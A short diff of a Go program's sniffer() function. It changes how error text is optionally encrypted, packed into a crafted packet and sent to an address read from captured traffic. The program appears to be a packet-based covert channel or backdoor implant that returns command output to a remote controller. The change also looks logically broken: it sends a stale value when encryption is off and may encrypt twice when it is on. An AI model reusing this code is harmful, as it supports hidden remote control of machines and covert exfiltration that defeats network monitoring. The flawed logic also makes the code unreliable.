@@ -129,12 +129,16 @@ func sniffer() {
 
 			if err != nil {
 				fail := err.Error()
-				fmt.Println("[FAILED]", string(fail))
-				generate_packet(string(fail), 0)
+				if SSM {
+					out = []byte(encrypt_decrypt(string(fail)))
+				}
+				fmt.Println("[FAILED]", string(out))
+				generate_packet(string(out), 0)
 				ipLayer := packet.Layer(layers.LayerTypeIPv4)
 				ip, _ := ipLayer.(*layers.IPv4)
 				sender(ip.DstIP.String())
 			}
+
 			if SSM {
 				out = []byte(encrypt_decrypt(string(out)))
 			}
